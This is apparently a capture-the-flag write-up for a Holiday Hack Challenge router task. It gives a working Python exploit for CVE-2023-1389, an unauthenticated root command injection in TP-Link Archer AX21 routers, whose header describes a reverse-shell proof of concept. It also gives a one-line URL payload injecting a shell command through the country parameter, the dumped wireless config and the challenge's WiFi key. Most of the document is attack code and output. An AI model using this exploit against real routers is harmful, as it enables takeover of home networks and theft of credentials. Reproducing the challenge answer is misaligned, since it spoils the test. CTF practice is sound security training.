## Dosis Network Down

_Difficulty:_ 

Hello! I'm JJ. I like rock, metal, and punk music. That's all I have to say about that. I accept BTC. Skeletor is my hero!

Alright then. Those bloody gnomes have proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.

Now I can't get online and it's doing me head in, innit?

We own this router, so we're just taking back what's ours, yeah?

You reckon you can help me hack past whatever chaos these little blighters left behind?

What is the WiFi password found in the router's config?

## Solucion

```python
#!/usr/bin/python3
# 
# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection
# Date: 07/25/2023
# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test. 
# The author will not be held responsible for any use or damage caused by this 
# program. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the 
# "/cgi-bin/luci/;stok=/locale" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it. 
# 
# This script is a short proof of concept to obtain a reverse shell. To read more 
# about the development of this script, you can read the blog post here:
# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
# Before running the script, start a nc listener on your preferred port -> run the script -> profit

import requests, urllib.parse, argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warning for connecting to a router with a self-signed certificate
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Take user input for the router IP, and attacker IP and port
parser = argparse.ArgumentParser()

#parser.add_argument("-r", "--router", dest = "router", default = "192.168.0.1", help="Router name")
#parser.add_argument("-a", "--attacker", dest = "attacker", default = "127.0.0.1", help="Attacker IP")
#parser.add_argument("-p", "--port",dest = "port", default = "9999", help="Local port")

#args = parser.parse_args()

router = "dosis-network-down.holidayhackchallenge.com"
command = "cat /etc/config/wireless"

# Generate the reverse shell command with the attacker IP and port
revshell = urllib.parse.quote(command)

print(revshell)

# URL to obtain the reverse shell
url_command = "https://" + router + "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(" + revshell + ")"

# Send the URL twice to run the command. Sending twice is necessary for the attack
r = requests.get(url_command, verify=False)
r = requests.get(url_command, verify=False)

print(r.text)

```

```bash
python exp.py
cat%20/etc/config/wireless
config wifi-device 'radio0'
	option type 'mac80211'
	option channel '6'
	option hwmode '11g'
	option path 'platform/ahb/18100000.wmac'
	option htmode 'HT20'
	option country 'US'

config wifi-device 'radio1'
	option type 'mac80211'
	option channel '36'
	option hwmode '11a'
	option path 'pci0000:00/0000:00:00.0'
	option htmode 'VHT80'
	option country 'US'

config wifi-iface 'default_radio0'
	option device 'radio0'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_2.4G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
	option device 'radio1'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_5G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'
```

## Forma mas facil

```
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)



config wifi-device 'radio0'
	option type 'mac80211'
	option channel '6'
	option hwmode '11g'
	option path 'platform/ahb/18100000.wmac'
	option htmode 'HT20'
	option country 'US'

config wifi-device 'radio1'
	option type 'mac80211'
	option channel '36'
	option hwmode '11a'
	option path 'pci0000:00/0000:00:00.0'
	option htmode 'VHT80'
	option country 'US'

config wifi-iface 'default_radio0'
	option device 'radio0'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_2.4G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'

config wifi-iface 'default_radio1'
	option device 'radio1'
	option network 'lan'
	option mode 'ap'
	option ssid 'DOSIS-247_5G'
	option encryption 'psk2'
	option key 'SprinklesAndPackets2025!'

```


SprinklesAndPackets2025!



https://www.exploit-db.com/exploits/51677

https://dosis-network-down.holidayhackchallenge.com/